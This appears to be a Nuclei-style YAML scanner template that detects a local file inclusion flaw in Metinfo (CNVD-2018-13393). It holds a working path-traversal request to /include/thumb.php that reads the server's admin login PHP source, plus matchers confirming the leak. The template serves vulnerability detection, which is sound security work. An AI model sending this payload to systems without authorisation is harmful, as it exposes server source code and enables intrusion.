id: metinfo-lfi-cnvd-2018-13393
info:
  name: Metinfo Local File Inclusion Vulnerability (CNVD-2018-13393)
  author: ProjectDiscoveryAI
  severity: high
  tags: lfi,CNVD-2018-13393
  description: |
    Metinfo Local File Inclusion vulnerability allows attackers to include local files on the server.

http:
  - method: GET
    path:
      - "{{BaseURL}}/include/thumb.php?dir=http..\\admin\\login\\login_check.php"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<?php"
        part: body
      - type: word
        words:
          - "login_met_cookie($metinfo_admin_name);"
        part: body
